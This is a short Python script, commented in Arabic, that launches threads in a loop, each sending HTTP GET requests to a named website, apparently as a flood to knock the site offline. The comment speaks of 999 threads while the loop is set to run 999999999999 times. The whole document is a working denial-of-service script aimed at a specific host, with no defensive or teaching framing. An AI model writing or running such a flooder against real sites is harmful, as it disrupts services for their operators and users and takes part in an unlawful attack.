import requests
import threading

url = 'http://en.josex1.name/'

# دالة لإرسال طلب HTTP
def send_request():
    try:
        response = requests.get(url)
        response.raise_for_status()
        print(f'Response Status: {response.status_code}')
    except requests.exceptions.RequestException as e:
        print(f'Error: {e}')

# إنشاء وتشغيل 999 خيط
threads = []
for _ in range(999999999999):
    thread = threading.Thread(target=send_request)
    threads.append(thread)
    thread.start()

# الانتظار حتى انتهاء جميع الخيوط
for thread in threads:
    thread.join()
